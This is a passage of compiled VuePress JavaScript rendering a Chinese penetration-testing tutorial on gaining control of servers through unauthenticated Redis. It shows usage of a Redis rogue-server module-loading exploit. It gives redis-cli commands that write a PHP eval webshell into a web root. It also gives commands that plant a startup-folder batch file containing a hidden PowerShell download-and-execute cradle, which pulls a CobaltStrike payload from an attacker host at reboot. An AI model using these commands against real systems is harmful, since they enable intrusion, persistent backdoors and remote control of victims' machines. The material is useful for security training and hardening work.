punctuation"}},[s._v("\\")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("___/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("__, "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("__,_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("____/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("_/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("   \n                                     __/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("                                            \n                                    "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("___/                                             \n@copyright n0b0dy @ r3kapig\n\nUsage: redis-rogue-server.py "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("options"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\nOptions:\n  -h, "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--help")]),s._v("           show this "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("help")]),s._v(" message and "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--rhost")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("REMOTE_HOST  target "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("host")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--rport")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("REMOTE_PORT  target redis port, default "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--lhost")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("LOCAL_HOST   rogue server "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ip")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--lport")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("LOCAL_PORT   rogue server listen port, default "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("21000")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--exp")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("EXP_FILE       Redis Module to load, default exp.so\n  -v, "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--verbose")]),s._v("        Show full data stream\nExample\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br")])]),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("python3 redis-rogue-server.py "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--rhost")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--lhost")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".51.146 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--exp")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("exp.so\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1030),alt:"img"}})]),s._v(" "),a("p",[a("img",{attrs:{src:t(1031),alt:"img"}})]),s._v(" "),a("h2",{attrs:{id:"windows-获取权限"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#windows-获取权限"}},[s._v("#")]),s._v(" Windows 获取权限")]),s._v(" "),a("h3",{attrs:{id:"webshell-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#webshell-2"}},[s._v("#")]),s._v(" Webshell")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("攻击成功的前提为：需要准确的知道Web目录位置")]),a("br"),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("可通过 phpinfo 或者 网站报错得知")]),a("br"),s._v(" "),a("p",[a("img",{attrs:{src:t(1032),alt:"img"}})]),s._v(" "),a("p",[s._v("这里测试的目标路径为："),a("code",[s._v("C:\\phpstudy_pro\\WWW")])]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v('192.168.0.123:6379> config set dir C:\\phpstudy_pro\\WWW\nOK\n192.168.0.123:6379> config set dbfilename shell.php\nOK\n192.168.0.123:6379> set test "'),a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v(" @"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("eval")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_POST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'shell'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v('"\nOK\n192.168.0.123:6379> save\nOK\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[a("img",{attrs:{src:t(1033),alt:"img"}})]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("成功写入木马，并可连接控制服务器")]),a("br"),s._v(" "),a("p",[a("img",{attrs:{src:t(1034),alt:"img"}})]),s._v(" "),a("h3",{attrs:{id:"启动项"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#启动项"}},[s._v("#")]),s._v(" 启动项")]),s._v(" "),a("p",[s._v("攻击方法与写入Linux启动项相似")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("需要高权限账户")]),a("br"),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("Windows 启动项目录为:")]),a("br"),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/")]),a("br"),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp")]),a("br"),s._v(" "),a("p",[s._v("首先创建 CobaltStrike监听")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("`Attacks -> Web Drive-By -> Script Web Delivery`")]),a("br"),s._v(" "),a("p",[a("img",{attrs:{src:t(1035),alt:"img"}})]),s._v(" "),a("p",[s._v("生成 Powershell 语句")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("powershell"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("exe "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("nop "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("w hidden "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("c "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v("\"IEX ((new-object net.webclient).downloadstring('http://192.168.0.126:6666/a'))\"")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("执行Redis命令写入语句")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".123")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" config set dir "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("OK")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".123")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" config set dbfilename cmd"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("bat\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("OK")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".123")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" set x "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"\\r\\n\\r\\npowershell.exe -nop -w hidden -c \\"IEX ((new-object net.webclient).downloadstring(\'http://192.168.0.126:6666/a\'))\\"\\r\\n\\r\\n"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("OK")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".123")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6379")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" save\n"),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("OK")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[s._v("当主机重启时就会执行命令上线 CobaltStrike")]),s._v(" "),a("p",[a("img",{attrs:{src:t(1036),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=r.exports}}]);